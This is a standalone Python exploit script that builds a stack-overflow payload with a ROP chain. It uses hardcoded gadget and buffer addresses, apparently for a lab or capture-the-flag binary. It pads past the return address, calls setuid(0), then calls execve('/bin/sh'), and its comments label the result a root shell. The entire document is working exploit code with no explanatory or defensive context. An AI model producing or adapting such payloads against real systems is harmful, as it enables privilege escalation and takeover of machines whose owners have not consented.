#!/usr/bin/env python3

import sys

# Buffer address from GDB
buf_address = 0x7ffffff411d0

# Gadget addresses
pop_rax = 0x456587
pop_rdi = 0x40250f
pop_rsi = 0x40a57e
pop_rdx_rbx = 0x48c0ab  # Remember: pops TWO values!
syscall = 0x4022c4

# Build the payload
# Bytes 0-7: "/bin/sh" string
payload = b"/bin/sh\x00"

# Bytes 8-119: Padding to reach return address (112 bytes)
padding_needed = 120 - len(payload)
payload += b"A" * padding_needed

# ROP chain starts here (byte 120, overwrites return address)

# Syscall 1: setuid(0)
payload += pop_rax.to_bytes(8, "little")
payload += (105).to_bytes(8, "little")     # rax = 105 (setuid)

payload += pop_rdi.to_bytes(8, "little")
payload += (0).to_bytes(8, "little")       # rdi = 0 (uid)

payload += syscall.to_bytes(8, "little")   # Execute setuid(0)

# Syscall 2: execve("/bin/sh", NULL, NULL)
payload += pop_rax.to_bytes(8, "little")
payload += (59).to_bytes(8, "little")      # rax = 59 (execve)

payload += pop_rdi.to_bytes(8, "little")
payload += buf_address.to_bytes(8, "little")  # rdi = address of "/bin/sh"

payload += pop_rsi.to_bytes(8, "little")
payload += (0).to_bytes(8, "little")       # rsi = NULL

payload += pop_rdx_rbx.to_bytes(8, "little")
payload += (0).to_bytes(8, "little")       # rdx = NULL
payload += (0).to_bytes(8, "little")       # rbx = junk (we don't care)

payload += syscall.to_bytes(8, "little")   # Execute execve → root shell!

sys.stdout.buffer.write(payload)

